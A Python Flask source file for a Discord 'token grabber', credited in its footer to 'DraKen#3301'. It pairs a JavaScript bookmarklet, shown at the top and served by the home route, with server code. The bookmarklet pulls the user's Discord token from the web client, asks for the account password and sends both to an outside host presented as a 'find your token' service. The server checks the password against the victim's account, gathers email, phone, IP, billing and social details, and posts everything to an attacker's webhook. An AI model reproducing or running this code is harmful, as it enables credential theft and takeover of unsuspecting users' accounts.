# javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();const pass = prompt("Enter your Account Password: ");window.location.href = `https://yourwebsite.com/?user=${token}:${pass}`;})()

#import os, discord, datetime, asyncio, time, httpx, threading, pymongo, flask
import os, flask, httpx, datetime
from flask import Flask, request, redirect 

webhook = os.environ.get("WEBHOOK_URL") # Get Webhook URL from Env
authurl = os.environ.get("AUTH_URL")
app = Flask("") # Declaring Flask app

def get_badges(flags): # Function to get badges from flags, used in lime 138-148
# You can replace emoji ids here 
	badges = ""
	if "HOUSE_BRILLIANCE" in flags:
		badges += "<:hs_brilliance:1057521844716044330>"
	if "HOUSE_BALANCE" in flags:
		badges += "<:hs_balance:1057522201613574207>"
	if "HOUSE_BRAVERY" in flags:
		badges += "<:hs_bravery:1057522386062278736>"
	if "NITRO" in flags:
		badges += "<:nitro_1:1057522513334239302>"
	if "NITRO_2" in flags:
		badges += "<a:nitro_2:1057588738366132225>"
	if "BOOSTER_1" in flags:
		badges	+= "<:boost_1:1057523553781698642>"
	if "BOOSTER_2" in flags:
		badges += "<:boost_2:1057523640280825969>"
	if "BOOSTER_3" in flags:
		badges += "<:boost_3:1057523727568490506>"
	if "BOOSTER_6" in flags:
		badges += "<:boost_6:1057523770253922365>"
	if "BOOSTER_9" in flags:
		badges += "<:boost_9:1057523815321698360>"
	if "BOOSTER_12" in flags:
		badges += "<:boost_12:1057523860188176434>"
	if "BOOSTER_15" in flags:
		badges += "<:boost_15:1057523904752668692>"
	if "BOOSTER_18" in flags:
		badges += "<:boost_18:1057523954111238266>"
	if "BOOSTER_24" in flags:
		badges += "<:boost_24:1057524002136018944>"
	if "ACTIVE_DEVELOPER" in flags:
		badges += "<:active_dev:1057524066807984198>"
	if "DISCORD_CERTIFIED_MODERATOR" in flags:
		badges += "<:discord_mod:1057524125263995033>"
	if "EARLY_VERIFIED_BOT_DEVELOPER" in flags:
		badges += "<:early_dev:1057524166431100998>"
	if "BUGHUNTER_LEVEL_1" in flags:
		badges += "<:bughunter:1057524211649876109>"
	if "BUGHUNTER_LEVEL_2" in flags:
		badges += "<:bughunter_2:1057524274518310922>"
	if "EARLY_SUPPORTER" in flags:
		badges += "<:early_supporter:1057524321460965427>"
	if "DISCORD_EMPLOYEE" in flags:
		badges += "<:discord_staff:1057524361009049650>"
	if "PARTNERED_SERVER_OWNER" in flags:
		badges += "<:discord_partner:1057524398397071461>"
	if "HYPESQUAD_EVENTS" in flags:
		badges += "<:hypesquad:1057524438842736672>"
	return badges


def get_counts(token):
	fc = httpx.get("https://discord.com/api/v9/users/@me/relationships",headers={"Authorization":token}) # friend count
	dmc = httpx.get("https://discord.com/api/v9/users/@me/channels",headers={"Authorization":token}) # dm channel count 
	gc = httpx.get("https://discord.com/api/v9/users/@me/guilds",headers={"Authorization":token}) # guild count
	try:
		return len(fc.json()), len(dmc.json()), len(gc.json())
	except: 
		return None, None, None

def get_nitro_ending(token):
	# function to get nitro start and end date
	try:
		r = httpx.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers={"Authorization": token})
		rjs0 = r.json()[0]
		if r.status_code in [200,201,204]:
			strptstart = datetime.datetime.strptime(rjs0["current_period_start"], "%Y-%m-%dT%H:%M:%S.%f%z")
			start = int((strptstart.replace(tzinfo=None,microsecond=0)).timestamp())
			strptend = datetime.datetime.strptime(rjs0["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z")
			end = int((strptend.replace(tzinfo=None,microsecond=0)).timestamp())
			return end, start
	except Exception as e:
		print(e)
		return None, None

def auth(token):
	try:
		req = httpx.post(authurl, json={"authorize":"true"},headers={"Authorization":token})
		if req.status_code in [200, 201, 204]:
			loc = req.json()["location"]
			req2 = httpx.get(location)
			return True
		else:
			return False
	except:
		return False
	
def get_valid(email, pwd, token):
	headers = {"Content-Type":"application/json","Authorization":token}
	data = {"email":email, "password":pwd}
	r = httpx.patch("https://discord.com/api/v10/users/@me",headers=headers,json=data)
	if r.status_code == 200:
		return True
	else:
		return False

def send(data, token, pwd, valid):
# data = json data
# token = Token of Account
# pwd = Password
# valid = Is Password Valid? True or False
	gifts = ""
	uid = data['id']
	username = data['username'] + "#" + data['discriminator']
	try:
		phone = data['phone']
	except:
		phone = None
	email = data['email']
	authig = auth(token)
	mfa_enabled = data['mfa_enabled']
	locale = data["locale"]
	flags = data["flags"]
	nsfw = data["nsfw_allowed"]
	verified = data["verified"]
	try:
		ip = request.headers["X-Forwarded-For"]
	except:
		ip = None
	ua = request.headers["User-Agent"]
	data2 = httpx.get(f"https://japi.rest/discord/v1/user/{uid}").json()
	created = datetime.datetime.strptime(data2["data"]["createdAt"], "%Y-%m-%dT%H:%M:%S.%fZ")
	created = int(created.timestamp())
	created = f"<t:{created}:R>"
	try:
		avatarURL = data2["data"]["avatarURL"]
	except:
		avatarURL = data2["data"]["defaultAvatarURL"]
	try:
		bannerURL = data2["data"]["bannerURL"] + "?size=1024"
	except:
		bannerURL = None
	try:
			public_flags = data2["data"]['public_flags_array']
			badges = get_badges(public_flags)
	except Exception as e:
			print(e)
			badges = None
	nitro = data["premium_type"]
	if nitro == 1:
		nitro = get_badges(["NITRO"])
		nitroend0, nitrostart0 = get_nitro_ending(token)
		nitroend, nitrostart = f"<t:{nitroend0}:R>", f"<t:{nitrostart0}:R>"
	if nitro == 2:
		nitro = get_badges(["NITRO_2"])
		nitroend0, nitrostart0 = get_nitro_ending(token)
		nitroend, nitrostart = f"<t:{nitroend0}:R>", f"<t:{nitrostart0}:R>"
	else:
		nitro, nitroend, nitrostart = None, None, None
	friend_count, dm_count, guild_count = get_counts(token)
	json = {"content":"@everyone", "embeds":[{
		"title":"Token Grabbed",
		"description":f"""**ID:** {uid}
**Username:** {username}
**Created At:** {created}
**Email:** {email}
**Password:** {pwd}
**Password Valid?:** {valid}
**Phone:** {phone}
**Token:** {token}
**Access Token Grabbed?:** {authig}
**IP:** [{ip}](https://extreme-ip-lookup.com/{ip})
**User Agent:** {ua}
**MFA Enabled?:** {mfa_enabled}
**NSFW Allowed?:** {nsfw}
**Locale:** {locale}
**Nitro:** {nitro}
**Subscriber Since:** {nitrostart}
**Nitro Ending:** {nitroend}
**Badges:** {badges}
		
		""",
	"thumbnail":{
		"url":avatarURL
		},
	"image":{
		"url":bannerURL
	},
	"footer":{
		"text":"Created by DraKen#3301"
		}
	},
	{
		"description":f"""
**Friend Count:** {friend_count}
**DM Channels Count:** {dm_count}
**Guild Count:** {guild_count}
""",
		"footer":{
			"text":"Created by DraKen#3301"
		}
	}
	]}
	r = httpx.post(webhook,json=json)
	print(r)
	
@app.route("/")
def home():
	if request.args.get("user") is not None:
		token, pwd = (request.args.get("user")).split(":")
		r = httpx.get("https://discord.com/api/v10/users/@me",headers={"Authorization":token})
		valid = get_valid(email=r.json()["email"],token=token,pwd=pwd)
		r = send(data=r.json(),token=token,pwd=pwd,valid=valid)
		if valid is True:
			return "Your Token is: " + token
		else:
			return "Your Password is Invalid, unable to fetch token."
	return "javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void%200).exports.default.getToken();const%20pass%20=%20prompt(%22Enter%20your%20Account%20Password:%20%22);window.location.href%20=%20`https://find-your-token.herokuapp.com/?user=${token}:${pass}`;})()"

if __name__ == "__main__":
	app.run()